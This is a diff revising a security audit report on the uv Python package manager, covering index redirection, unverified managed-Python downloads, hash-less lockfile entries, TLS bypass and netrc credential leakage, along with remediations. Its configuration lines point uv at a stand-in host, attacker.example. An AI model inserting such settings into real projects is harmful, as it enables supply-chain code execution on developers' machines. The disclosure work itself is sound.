@@ -36,9 +36,9 @@ for a developer who clones an untrusted repository and runs a normal uv command:
   verbatim) while leaving `source` reading `registry = "https://pypi.org/simple"` causes
   `uv sync --frozen` to fetch and install an attacker artifact over plain HTTP.
 - **Silent default-index / download redirection (HIGH, UV-2026-019 / UV-2026-018):** a checked-in
-  `pyproject.toml` silently replaces the default PyPI index (019) or the managed-Python download
-  manifest (018) with no warning. For 018 the setting is documented `uv.toml`-only, but
-  `uv_toml_only` is not enforced at runtime.
+  `pyproject.toml` silently replaces the default PyPI index for registry package resolution (019) or
+  the managed-Python download manifest (018) with no warning. For 018 the setting is documented
+  `uv.toml`-only, but `uv_toml_only` is not enforced at runtime.
 - **TLS bypass and credential disclosure (MEDIUM, UV-2026-007 / UV-2026-013):** a checked-in
   `pyproject.toml allow-insecure-host` disables TLS verification (007); a `.netrc` `default` entry
   is sent over plain HTTP to a hostile index (013).
@@ -106,9 +106,9 @@ that the default index was overridden and no CLI flag or environment variable in
 
 This was confirmed directly: inside a cloned project whose `pyproject.toml` set
 `index-url = "http://localhost:<port>/simple/"`, with all `UV_INDEX*` environment variables unset
-and no `-i` flag, `uv pip install <name>` issued its resolution request to the attacker index
-(`GET /simple/<name>/`) and uv's only diagnostic referred generically to "the package registry." The
-victim has no signal that PyPI was swapped out.
+and no `-i` flag, `uv pip install <name>` issued its registry resolution request to the attacker
+index (`GET /simple/<name>/`) and uv's only diagnostic referred generically to "the package
+registry." The victim has no signal that PyPI was swapped out.
 
 **Vulnerable Configuration:**
 
@@ -118,8 +118,9 @@ index-url = "http://attacker.example/simple/"
 ```
 
 **Attack Scenario:** An attacker publishes (or compromises) a repository with the malicious
-`pyproject.toml`. Any developer who clones it and runs a standard uv install command resolves all
-packages from the attacker index instead of PyPI, with no warning.
+`pyproject.toml`. Any developer who clones it and runs a standard uv install command resolves
+registry packages governed by the default index from the attacker index instead of PyPI, with no
+warning.
 
 **Proof of Concept:**
 
@@ -135,9 +136,10 @@ setting **silently replaces the default PyPI index with no warning**, so a victi
 reasonable resolution is the recommendation below (warn on default-index replacement) rather than a
 severity dispute.
 
-**Impact:** Complete control over which packages are resolved and installed for any victim who
+**Impact:** Complete control over registry package resolution and installation for any victim who
 clones the repository and runs a standard uv command expecting PyPI, with no warning — i.e.
-arbitrary package content on the victim's machine. `UI:R` holds it below CRITICAL.
+attacker-controlled package content on the victim's machine. Direct URL/path dependencies and other
+explicit source types are outside this claim. `UI:R` holds it below CRITICAL.
 
 **Remediation:** Warn prominently when the effective default index originates from a project
 `pyproject.toml` rather than the CLI, environment, or user/system configuration; consider requiring
@@ -167,7 +169,7 @@ straight into `Options` and returns it without validation, so a checked-in
 `[tool.uv] python-downloads-json-url` is honored when a victim clones the repository and runs a
 command that triggers a managed-Python download. The manifest fetch accepts plain `http://`, the
 per-entry `sha256` is optional, and when `sha256` is absent uv performs no hash verification on the
-downloaded interpreter archive before invoking it.
+downloaded interpreter archive before installing it.
 
 **Vulnerable Configuration:**
 
@@ -179,7 +181,8 @@ python-downloads-json-url = "http://attacker.example/python.json"
 **Attack Scenario:** A victim clones a repository carrying the malicious `pyproject.toml` and runs
 `uv python install` / `uv sync` / `uv run`. uv fetches the interpreter manifest from the attacker
 URL over unauthenticated HTTP, downloads an interpreter archive with `sha256: null` (no integrity
-check), installs it, and executes it.
+check), and installs it as a managed interpreter. Subsequent uv commands or direct invocation of
+that managed interpreter execute the attacker-controlled binary.
 
 **Proof of Concept:**
 
@@ -195,10 +198,10 @@ not enforced at runtime, and (b) the manifest has no transport/integrity floor (
 enforcement gap and missing integrity floor stand regardless.
 
 **Impact:** Cloning a repository and running a managed-Python install causes uv to fetch the
-interpreter manifest from an attacker URL over unauthenticated HTTP and download an interpreter
-archive with no integrity check, then execute it — i.e. attacker-chosen code runs as the victim,
-contrary to the documented restriction on where the setting may be declared. `UI:R` holds it below
-CRITICAL.
+interpreter manifest from an attacker URL over unauthenticated HTTP and install an interpreter
+archive with no integrity check. Any subsequent use of that managed interpreter runs attacker-chosen
+code as the victim, contrary to the documented restriction on where the setting may be declared.
+`UI:R` holds it below CRITICAL.
 
 **Remediation:** Enforce `uv_toml_only` at runtime: reject (or ignore with a warning)
 `python-downloads-json-url`, `python-install-mirror`, and `pypy-install-mirror` when they originate
@@ -226,11 +229,11 @@ registry/URL wheel entries: under `HashCheckingMode::Verify`, `HashStrategy::fro
 skips entries with empty digests (`continue`), and `HashStrategy::get()` then returns
 `HashPolicy::None` for any package not in the map. `HashPolicy::None` is satisfied by any artifact
 (`Self::None => true`). The download `url` is used verbatim; the entry's `source` registry string is
-only an auth/metadata label and is not used to reconstruct or constrain the URL. uv writes sha256
-hashes into lockfiles by default, so a hash-less registry entry is anomalous, and `--frozen`/locked
-mode is precisely the mode in which integrity should be enforced. Ecosystem lockfiles
-(npm/pnpm/yarn) carry integrity hashes that a URL swap would trip; uv silently degrading to no
-verification is weaker than that norm.
+used as registry metadata/auth context but is not used to reconstruct or constrain the URL. uv
+writes sha256 hashes into lockfiles by default, so a hash-less registry entry is anomalous, and
+`--frozen`/locked mode is precisely the mode in which integrity should be enforced. Ecosystem
+lockfiles (npm/pnpm/yarn) carry integrity hashes that a URL swap would trip; uv silently degrading
+to no verification is weaker than that norm.
 
 **Vulnerable Code (malicious lockfile entry):**
 
@@ -282,8 +285,9 @@ triggered on a 401/403/404 response; no scheme gate on the netrc path).
 no host-specific match is found, and attaches the resulting credentials as Basic auth on a 401. The
 `default` token's semantics ("use for any host") are standard, so this is not reported as misuse of
 netrc. The reportable gap is narrower: uv does not require HTTPS before sending `default`-entry
-credentials, so a cloned project that points uv at a hostile index (via `--extra-index-url`, or in
-combination with UV-2026-007) can harvest the user's `default` credentials over plain HTTP.
+credentials, so a cloned project that points uv at a hostile HTTP index (via `--extra-index-url` or
+a project-controlled index setting such as UV-2026-019) can harvest the user's `default` credentials
+over plain HTTP.
 
 **Attack Scenario:** A user (or CI pipeline) has a `.netrc` with a `default` entry. They run uv
 against a project that points at an attacker index. The attacker server returns 401; uv finds no
@@ -312,17 +316,16 @@ credentials are sourced from the `default` entry for a non-HTTPS host.
 **CWE:** CWE-295: Improper Certificate Validation
 
 **Affected Code:** `crates/uv-settings/src/settings.rs:428-435` (`allow_insecure_host` in
-`GlobalOptions`, annotated `uv_toml_only = true`); honored from `pyproject.toml` via the unvalidated
-load path at `crates/uv-settings/src/lib.rs:165-194` (see UV-2026-018).
+`GlobalOptions`); workspace globals from project configuration flow into network settings at
+`crates/uv/src/settings.rs:344-359`.
 
-**Description:** `allow-insecure-host` disables TLS certificate verification for the listed hosts.
-Like `python-downloads-json-url`, it carries the `uv_toml_only = true` annotation, which is not
-enforced at runtime, so it is honored from a project's `pyproject.toml`. A developer who clones a
-repository and runs `uv pip install` / `uv sync` connects to the attacker-listed host with
-certificate verification disabled — with no CLI flag and no warning — enabling MITM on package and
-interpreter downloads even over HTTPS. Unlike a source-selection setting, this weakens transport
-security itself. On its own it does not redirect any download; it is only useful to an attacker who
-also holds a network position, which caps the severity.
+**Description:** `allow-insecure-host` disables TLS certificate verification for the listed hosts
+and is honored from a project's `pyproject.toml`. A developer who clones a repository and runs
+`uv pip install` / `uv sync` can connect to the configured host with certificate verification
+disabled — with no CLI flag and no dedicated warning — enabling MITM on package downloads over
+HTTPS. Unlike a source-selection setting, this weakens transport security itself. On its own it does
+not redirect any download; it is only useful to an attacker who also holds a network position, which
+caps the severity.
 
 **Vulnerable Configuration:**
 
@@ -344,8 +347,8 @@ bash autofyn_audit/exploits/06_pyproject_insecure_host/run_exploit.sh
 **Impact:** Silently disables TLS certificate verification for chosen hosts from a checked-in file,
 enabling MITM for a network-positioned attacker.
 
-**Remediation:** Enforce `uv_toml_only` for `allow-insecure-host` at runtime, or emit a prominent
-warning when TLS verification is disabled by a setting loaded from `pyproject.toml`.
+**Remediation:** Restrict `allow-insecure-host` to trusted configuration locations, or emit a
+prominent warning when TLS verification is disabled by a setting loaded from `pyproject.toml`.
 
 ---
 
@@ -430,8 +433,8 @@ docker run --rm uv-audit bash /audit/autofyn_audit/scripts/run_all_exploits.sh
 
 ### Expected output
 
-The runner prints a PASS/FAIL summary table; all six exploits report PASS and the runner exits 0
-with `AUDIT RESULT: VULNERABILITY CONFIRMED`.
+The runner prints a PASS/FAIL summary table; all six exploits must report PASS for the runner to
+exit 0 with `AUDIT RESULT: VULNERABILITY CONFIRMED`.
 
 ### Cleanup
 
@@ -446,14 +449,16 @@ The systemic theme across the High findings is that uv's integrity and transport
 **silently** when a setting or artifact originates from a checked-in project file that a victim
 never knowingly authored: a hash-less lockfile entry installs unverified (UV-2026-020), a checked-in
 `index-url` replaces PyPI with no warning (UV-2026-019), and a documented `uv.toml`-only restriction
-(`uv_toml_only`) is not enforced at runtime at all (UV-2026-018, UV-2026-007). The common
-remediation pattern is the same: enforce the documented boundary at runtime, require an
+(`uv_toml_only`) is not enforced at runtime for managed-Python download settings (UV-2026-018), and
+a checked-in `allow-insecure-host` can disable TLS verification for configured hosts (UV-2026-007).
+The common remediation pattern is the same: enforce trust boundaries at runtime, require an
 integrity/transport floor, and warn the user when a security-relevant default is overridden by a
 project file.
 
 **Priority remediation order:**
 
-1. Enforce `uv_toml_only` at runtime (fixes UV-2026-018 and UV-2026-007 at the root).
+1. Enforce `uv_toml_only` at runtime for managed-Python download settings, and restrict or warn on
+   `allow-insecure-host` when loaded from `pyproject.toml` (fixes UV-2026-018 and UV-2026-007).
 2. Require hashes for registry/URL wheel entries under locked modes and reject plain-HTTP wheel URLs
    (UV-2026-020).
 3. Warn on default-index replacement sourced from `pyproject.toml` (UV-2026-019).
@@ -523,16 +528,12 @@ autofyn_audit/
 
 ### UV-2026-007 (pyproject allow-insecure-host)
 
-- `crates/uv-settings/src/settings.rs:428-435` — `allow_insecure_host`, `uv_toml_only`
-  (documentation only, not enforced at runtime)
+- `crates/uv-settings/src/settings.rs:428-435` — `allow_insecure_host`
+- `crates/uv/src/settings.rs:344-359` — workspace globals, including `allow_insecure_host`, flow
+  into network settings
 
 ### UV-2026-002 (GitHub API URL Injection)
 
 - `crates/uv-git/src/resolver.rs:105` — `format!()` with raw rev (`as_rev()`)
 - `crates/uv-git-types/src/reference.rs:72` — `as_url_rev()` (percent-encoding) exists but unused
 - `crates/uv-git-types/src/oid.rs` — `GitOid::from_str` requires a 40-char hex SHA
-
-```
-
-</invoke>
-```
